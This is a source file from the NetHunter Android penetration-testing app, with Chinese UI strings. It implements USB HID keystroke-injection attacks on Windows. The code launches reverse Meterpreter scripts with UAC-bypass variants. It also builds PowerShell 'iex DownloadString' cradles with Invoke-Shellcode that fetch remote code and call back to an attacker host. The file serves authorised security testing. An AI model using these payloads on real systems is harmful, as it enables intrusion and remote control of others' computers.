package com.offsec.nethunter;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Parcelable;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Spinner;

import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.offsec.nethunter.utils.NhPaths;
import com.offsec.nethunter.utils.ShellExecuter;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import androidx.fragment.app.FragmentPagerAdapter;
import androidx.viewpager.widget.ViewPager;

public class HidFragment extends Fragment {
    private ViewPager mViewPager;
    private SharedPreferences sharedpreferences;
    private final CharSequence[] platforms = {"无 UAC 绕过", "Windows 7", "Windows 8", "Windows 10"};
    private final CharSequence[] languages = {"美国英语", "比利时", "英国英语", "丹麦语", "法语", "德语", "意大利语", "挪威语", "葡萄牙语", "俄语", "西班牙语", "瑞典语", "加拿大多语言", "加拿大", "匈牙利语"};
    private String configFilePath;
    private Context context;
    private Activity activity;
    private static final String ARG_SECTION_NUMBER = "section_number";
    private final ShellExecuter exe = new ShellExecuter();

    public static HidFragment newInstance(int sectionNumber) {
        HidFragment fragment = new HidFragment();
        Bundle args = new Bundle();
        args.putInt(ARG_SECTION_NUMBER, sectionNumber);
        fragment.setArguments(args);
        return fragment;
    }
    private boolean isHIDenable = false;

    @Override
    public void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        context = getContext();
        activity = getActivity();
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        View rootView = inflater.inflate(R.layout.hid, container, false);
        HidFragment.TabsPagerAdapter tabsPagerAdapter = new TabsPagerAdapter(getChildFragmentManager());

        mViewPager = rootView.findViewById(R.id.pagerHid);
        mViewPager.setAdapter(tabsPagerAdapter);

        configFilePath = NhPaths.CHROOT_PATH() + "/var/www/html/powersploit-payload";

        mViewPager.addOnPageChangeListener(new ViewPager.SimpleOnPageChangeListener() {
            @Override
            public void onPageSelected(int position) {
                activity.invalidateOptionsMenu();
            }
        });
        setHasOptionsMenu(true);
        sharedpreferences = activity.getSharedPreferences(BuildConfig.APPLICATION_ID, Context.MODE_PRIVATE);
        check_HID_enable();
        return rootView;
    }

    @Override
    public void onCreateOptionsMenu(@NonNull Menu menu, MenuInflater inflater) {
        inflater.inflate(R.menu.hid, menu);
    }

    @Override
    public void onPrepareOptionsMenu(Menu menu) {
        int pageNum = mViewPager.getCurrentItem();
        final MenuItem sourceButton = menu.findItem(R.id.source_button);
        // WearOS 优化
        boolean iswatch = requireActivity().getPackageManager().hasSystemFeature(PackageManager.FEATURE_WATCH);
        if (pageNum == 0) {
            sourceButton.setVisible(!iswatch);
        } else {
            sourceButton.setVisible(false);
        }
        activity.invalidateOptionsMenu();
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case R.id.start_service:
                if (isHIDenable) {
                    start();
                } else {
                    if (new File("/config/usb_gadget/g1").exists())
                        NhPaths.showMessage_long(context,"HID 接口未启用！请在 USB Arsenal 中启用. ");
                    else if (new File("/dev/hidg0").exists()) {
                        NhPaths.showMessage_long(context, "正在修复 HID 接口权限...");
                        exe.RunAsRoot(new String[]{"chmod 666 /dev/hidg*"});
                    }
                    else NhPaths.showMessage_long(context,"HID 接口未启用或未打补丁, 请检查内核配置. ");
                }
                return true;
            case R.id.stop_service:
                reset();
                return true;
            case R.id.admin:
                openDialog();
                return true;
            case R.id.chooseLanguage:
                openLanguageDialog();
                return true;
            case R.id.source_button:
                Intent i = new Intent(activity, EditSourceActivity.class);
                i.putExtra("path", configFilePath);
                startActivity(i);
                return true;
            default:
                return super.onOptionsItemSelected(item);
        }
    }

    private void start() {
        int keyboardLayoutIndex = sharedpreferences.getInt("HIDKeyboardLayoutIndex", 0);
        String lang;
        switch (keyboardLayoutIndex) {
            case 1:
                lang = "be";
                break;
            case 2:
                lang = "uk";
                break;
            case 3:
                lang = "dk";
                break;
            case 4:
                lang = "fr";
                break;
            case 5:
                lang = "de";
                break;
            case 6:
                lang = "it";
                break;
            case 7:
                lang = "no";
                break;
            case 8:
                lang = "pt";
                break;
            case 9:
                lang = "ru";
                break;
            case 10:
                lang = "es";
                break;
            case 11:
                lang = "sv";
                break;
            case 12:
                lang = "cm";
                break;
            case 13:
                lang = "ca";
                break;
            case 14:
                lang = "hu";
                break;
            default:
                lang = "us";
                break;
        }

        int UACBypassIndex = sharedpreferences.getInt("UACBypassIndex", 0);
        final String[] command = new String[1];
        int pageNum = mViewPager.getCurrentItem();
        if (pageNum == 0) {
            switch (UACBypassIndex) {
                case 0:
                    command[0] = "su -c '" + NhPaths.APP_SCRIPTS_PATH + "/bootkali start-rev-met --" + lang + "'";
                    break;
                case 1:
                    command[0] = "su -c '" + NhPaths.APP_SCRIPTS_PATH + "/bootkali start-rev-met-elevated-win7 --" + lang + "'";
                    break;
                case 2:
                    command[0] = "su -c '" + NhPaths.APP_SCRIPTS_PATH + "/bootkali start-rev-met-elevated-win8 --" + lang + "'";
                    break;
                case 3:
                    command[0] = "su -c '" + NhPaths.APP_SCRIPTS_PATH + "/bootkali start-rev-met-elevated-win10 --" + lang + "'";
                    break;
                default:
                    NhPaths.showMessage(context,"未选择任何选项 1");
                    break;
            }
        } else if (pageNum == 1) {
            switch (UACBypassIndex) {
                case 0:
                    command[0] = "su -c '" + NhPaths.APP_SCRIPTS_PATH + "/bootkali hid-cmd --" + lang + "'";
                    break;
                case 1:
                    command[0] = "su -c '" + NhPaths.APP_SCRIPTS_PATH + "/bootkali hid-cmd-elevated-win7 --" + lang + "'";
                    break;
                case 2:
                    command[0] = "su -c '" + NhPaths.APP_SCRIPTS_PATH + "/bootkali hid-cmd-elevated-win8 --" + lang + "'";
                    break;
                case 3:
                    command[0] = "su -c '" + NhPaths.APP_SCRIPTS_PATH + "/bootkali hid-cmd-elevated-win10 --" + lang + "'";
                    break;
                default:
                    NhPaths.showMessage(context,"未选择任何选项 2");
                    break;
            }
        }
        NhPaths.showMessage(context, getString(R.string.attack_launched));
        new Thread(() -> {
            ShellExecuter exe = new ShellExecuter();
            exe.RunAsRoot(command);
            //Logger.appendLog(outp1);
            mViewPager.post(() -> NhPaths.showMessage(context,"攻击执行结束. "));
        }).start();
    }

    private void reset() {
        ShellExecuter exe = new ShellExecuter();
        String[] command = {"stop-badusb"};
        exe.RunAsRoot(command);
        NhPaths.showMessage(context,"正在重置 USB");
    }

    private void openDialog() {
        int UACBypassIndex = sharedpreferences.getInt("UACBypassIndex", 0);
        MaterialAlertDialogBuilder builder = new MaterialAlertDialogBuilder(activity, R.style.DialogStyleCompat);
        builder.setTitle("UAC 绕过: ");
        builder.setPositiveButton("确定", (dialog, which) -> {
        });

        builder.setSingleChoiceItems(platforms, UACBypassIndex, (dialog, which) -> {
            Editor editor = sharedpreferences.edit();
            editor.putInt("UACBypassIndex", which);
            editor.apply();
        });
        builder.show();
    }

    private void openLanguageDialog() {
        int keyboardLayoutIndex = sharedpreferences.getInt("HIDKeyboardLayoutIndex", 0);

        MaterialAlertDialogBuilder builder = new MaterialAlertDialogBuilder(activity, R.style.DialogStyleCompat);
        builder.setTitle("键盘布局: ");
        builder.setPositiveButton("确定", (dialog, which) -> {

        });

        builder.setSingleChoiceItems(languages, keyboardLayoutIndex, (dialog, which) -> {
            Editor editor = sharedpreferences.edit();
            editor.putInt("HIDKeyboardLayoutIndex", which);
            editor.apply();
        });
        builder.show();
    }

    public static class TabsPagerAdapter extends FragmentPagerAdapter {
        public TabsPagerAdapter(FragmentManager fm) {
            super(fm);
        }

        @NonNull
        @Override
        public Fragment getItem(int i) {
            switch (i) {
                case 0:
                    return new PowerSploitFragment();
                case 1:
                    return new WindowsCmdFragment();
                default:
                    return new PowershellHttpFragment();
            }
        }

        @Override
        public Parcelable saveState() {
            return null;
        }

        @Override
        public int getCount() {
            return 3;
        }

        @Override
        public CharSequence getPageTitle(int position) {
            switch (position) {
                case 1:
                    return "Windows CMD";
                case 0:
                    return "PowerSploit";
                default:
                    return "Powershell HTTP Payload";
            }
        }
    }

    public static class PowerSploitFragment extends HidFragment implements OnClickListener {
        private Context context;
        private String configFilePath;
        private String configFileUrlPath;

        @Override
        public void onCreate(@Nullable Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            context = getContext();
            configFilePath = NhPaths.CHROOT_PATH() + "/var/www/html/powersploit-payload";
            configFileUrlPath = NhPaths.CHROOT_PATH() + "/var/www/html/powersploit-url";
        }

        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container,
                                 Bundle savedInstanceState) {
            View rootView = inflater.inflate(R.layout.hid_powersploit, container, false);
            Button b = rootView.findViewById(R.id.powersploitOptionsUpdate);
            b.setOnClickListener(this);
            loadOptions(rootView);
            return rootView;
        }

        public void onClick(View v) {
            if (v.getId() == R.id.powersploitOptionsUpdate) {
                if (getView() == null) {
                    return;
                }
                ShellExecuter exe = new ShellExecuter();
                EditText ip = getView().findViewById(R.id.ipaddress);
                EditText port = getView().findViewById(R.id.port);

                Spinner payload = getView().findViewById(R.id.payload);
                String payloadValue = payload.getSelectedItem().toString();

                EditText newPayloadUrl = getView().getRootView().findViewById(R.id.payloadUrl);
                String newString = "Invoke-Shellcode -Payload " + payloadValue + " -Lhost " + ip.getText() + " -Lport " + port.getText() + " -Force";
                String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); " + newString;

                boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
                if (!isSaved) {
                    NhPaths.showMessage(context, "源代码未更新 (configFileUrlPath)");
                }
            } else {
                NhPaths.showMessage(context, "未知点击");
            }
        }

        private void loadOptions(final View rootView) {
            final EditText payloadUrl = rootView.findViewById(R.id.payloadUrl);
            final EditText port = rootView.findViewById(R.id.port);
            final Spinner payload = rootView.findViewById(R.id.payload);
            final ShellExecuter exe = new ShellExecuter();

            new Thread(() -> {
                final String textUrl = exe.ReadFile_SYNC(configFileUrlPath);
                final String text = exe.ReadFile_SYNC(configFilePath);
                String regExPatPayloadUrl = "DownloadString\\(\"(.*)\"\\)";
                Pattern patternPayloadUrl = Pattern.compile(regExPatPayloadUrl, Pattern.MULTILINE);
                final Matcher matcherPayloadUrl = patternPayloadUrl.matcher(textUrl);

                String[] lines = text.split("\n");
                final String line = lines[lines.length - 1];

                String regExPatIp = "-Lhost (.*) -Lport";
                Pattern patternIp = Pattern.compile(regExPatIp, Pattern.MULTILINE);
                final Matcher matcherIp = patternIp.matcher(line);

                String regExPatPort = "-Lport (.*) -Force";
                Pattern patternPort = Pattern.compile(regExPatPort, Pattern.MULTILINE);
                final Matcher matcherPort = patternPort.matcher(line);

                String regExPatPayload = "-Payload (.*) -Lhost";
                Pattern patternPayload = Pattern.compile(regExPatPayload, Pattern.MULTILINE);
                final Matcher matcherPayload = patternPayload.matcher(line);

                payloadUrl.post(() -> {

                    if (matcherPayloadUrl.find()) {
                        String payloadUrlValue = matcherPayloadUrl.group(1);
                        payloadUrl.setText(payloadUrlValue);
                    }

                    if (matcherIp.find()) {
                        String ipValue = matcherIp.group(1);
                        EditText ip = rootView.findViewById(R.id.ipaddress);
                        ip.setText(ipValue);
                    }

                    if (matcherPort.find()) {
                        String portValue = matcherPort.group(1);
                        port.setText(portValue);
                    }

                    if (matcherPayload.find()) {
                        String payloadValue = matcherPayload.group(1);
                        @SuppressWarnings("unchecked")
                        ArrayAdapter<String> myAdap = (ArrayAdapter<String>) payload.getAdapter();
                        myAdap.getPosition(payloadValue);
                        int spinnerPosition;
                        spinnerPosition = myAdap.getPosition(payloadValue);
                        payload.setSelection(spinnerPosition);
                    }
                });
            }).start();
        }
    }

    public static class WindowsCmdFragment extends HidFragment implements OnClickListener {
        private Context context;
        private Activity activity;
        private String configFilePath;
        private String loadFilePath;
        final ShellExecuter exe = new ShellExecuter();

        @Override
        public void onCreate(@Nullable Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            context = getContext();
            activity = getActivity();
            configFilePath = NhPaths.APP_SD_FILES_PATH + "/configs/hid-cmd.conf";
            loadFilePath = NhPaths.APP_SD_FILES_PATH + "/scripts/hid/";
        }

        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container,
                                 Bundle savedInstanceState) {
            View rootView = inflater.inflate(R.layout.hid_windows_cmd, container, false);
            EditText source = rootView.findViewById(R.id.windowsCmdSource);
            exe.ReadFile_ASYNC(configFilePath, source);
            Button b = rootView.findViewById(R.id.windowsCmdUpdate);
            Button b1 = rootView.findViewById(R.id.windowsCmdLoad);
            Button b2 = rootView.findViewById(R.id.windowsCmdSave);
            b.setOnClickListener(this);
            b1.setOnClickListener(this);
            b2.setOnClickListener(this);
            return rootView;
        }

        private static final int PICKFILE_RESULT_CODE = 1;

        public void onClick(View v) {
            switch (v.getId()) {
                case R.id.windowsCmdUpdate:
                    if (getView() == null) {
                        return;
                    }
                    EditText source = getView().findViewById(R.id.windowsCmdSource);
                    String text = source.getText().toString();
                    boolean isSaved = exe.SaveFileContents(text, configFilePath);
                    if (isSaved) {
                        NhPaths.showMessage(context, "源代码已更新");
                    }

                    break;
                case R.id.windowsCmdLoad:
                    try {
                        File scriptsDir = new File(NhPaths.APP_SD_FILES_PATH, loadFilePath);
                        if (!scriptsDir.exists()) scriptsDir.mkdirs();
                    } catch (Exception e) {
                        NhPaths.showMessage(context, e.getMessage());
                    }
                    Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
                    Uri selectedUri = Uri.parse(NhPaths.APP_SD_FILES_PATH + loadFilePath);
                    intent.setDataAndType(selectedUri, "file/*");
                    startActivityForResult(intent, PICKFILE_RESULT_CODE);
                    break;
                case R.id.windowsCmdSave:
                    try {
                        File scriptsDir = new File(NhPaths.APP_SD_FILES_PATH, loadFilePath);
                        if (!scriptsDir.exists()) scriptsDir.mkdirs();
                    } catch (Exception e) {
                        NhPaths.showMessage(context, e.getMessage());
                    }
                    MaterialAlertDialogBuilder alert = new MaterialAlertDialogBuilder(activity, R.style.DialogStyleCompat);

                    alert.setTitle("名称");
                    alert.setMessage("请输入脚本名称. ");

                    // 设置一个 EditText 以获取用户输入
                    final EditText input = new EditText(activity);
                    alert.setView(input);

                    alert.setPositiveButton("确定", (dialog, whichButton) -> {
                        String value = input.getText().toString();
                        if (!value.isEmpty()) {
                            //FIXME 保存文件（询问名称）
                            File scriptFile = new File(loadFilePath + File.separator + value + ".conf");
                            if (!scriptFile.exists()) {
                                try {
                                    if (getView() == null) {
                                        return;
                                    }
                                    EditText source1 = getView().findViewById(R.id.windowsCmdSource);
                                    String text1 = source1.getText().toString();
                                    scriptFile.createNewFile();
                                    FileOutputStream fOut = new FileOutputStream(scriptFile);
                                    OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
                                    myOutWriter.append(text1);
                                    myOutWriter.close();
                                    fOut.close();
                                    NhPaths.showMessage(context,"脚本已保存");
                                } catch (Exception e) {
                                    NhPaths.showMessage(context, e.getMessage());
                                }
                            } else {
                                NhPaths.showMessage(context,"文件已存在");
                            }
                        } else {
                            NhPaths.showMessage(context,"名称无效");
                        }
                    });
                    alert.setNegativeButton("取消", (dialog, whichButton) -> {
                        ///Do nothing
                    });
                    alert.show();
                    break;
                default:
                    NhPaths.showMessage(context,"未知点击");
                    break;
            }
        }

        @Override
        public void onActivityResult(int requestCode, int resultCode, Intent data) {
            if (requestCode == PICKFILE_RESULT_CODE && (resultCode == Activity.RESULT_OK && getView() != null)) {
                String FilePath = Objects.requireNonNull(data.getData()).getPath();
                EditText source = getView().findViewById(R.id.windowsCmdSource);
                exe.ReadFile_ASYNC(FilePath, source);
                NhPaths.showMessage(context, "脚本已加载");

            }
        }
    }

    public static class PowershellHttpFragment extends HidFragment implements OnClickListener {
        private Context context;
        private String configFilePath;
        private String configFileUrlPath;

        @Override
        public void onCreate(@Nullable Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            context = getContext();
            configFilePath = NhPaths.CHROOT_PATH() + "/var/www/html/powershell-payload";
            configFileUrlPath = NhPaths.CHROOT_PATH() + "/var/www/html/powershell-url";
        }

        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container,
                                 Bundle savedInstanceState) {
            View rootView = inflater.inflate(R.layout.hid_powershell_http, container, false);
            Button b = rootView.findViewById(R.id.powershellOptionsUpdate);
            b.setOnClickListener(this);
            loadOptions(rootView);
            return rootView;
        }

        public void onClick(View v) {
            if (v.getId() == R.id.powershellOptionsUpdate) {
                if (getView() == null) {
                    return;
                }
                ShellExecuter exe = new ShellExecuter();
                EditText newPayloadUrl = getView().getRootView().findViewById(R.id.payloadUrl);
                String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); ";

                boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
                if (!isSaved) {
                    NhPaths.showMessage(context, "源代码未更新 (configFileUrlPath)");
                }
            } else {
                NhPaths.showMessage(context, "未知点击");
            }
        }

        private void loadOptions(final View rootView) {
            final EditText payloadUrl = rootView.findViewById(R.id.payloadUrl);
            final ShellExecuter exe = new ShellExecuter();

            new Thread(() -> {
                final String textUrl = exe.ReadFile_SYNC(configFileUrlPath);
                final String text = exe.ReadFile_SYNC(configFilePath);
                String regExPatPayloadUrl = "DownloadString\\(\"(.*)\"\\)";
                Pattern patternPayloadUrl = Pattern.compile(regExPatPayloadUrl, Pattern.MULTILINE);
                final Matcher matcherPayloadUrl = patternPayloadUrl.matcher(textUrl);

                String[] lines = text.split("\n");
                final String line = lines[lines.length - 1];

                payloadUrl.post(() -> {
                    if (matcherPayloadUrl.find()) {
                        String payloadUrlValue = matcherPayloadUrl.group(1);
                        payloadUrl.setText(payloadUrlValue);
                    }
                });
            }).start();
        }
    }

    private void check_HID_enable() {
        new Thread(() -> {
            ShellExecuter exe_check = new ShellExecuter();
            String[] hidgs = {"/dev/hidg0", "/dev/hidg1"};
            for (String hidg : hidgs) {
                if (!exe_check.RunAsRootOutput("su -c \"stat -c '%a' " + hidg + "\"").equals("666")) {
                    isHIDenable = false;
                    break;
                }
                isHIDenable = true;
            }
        }).start();
    }
}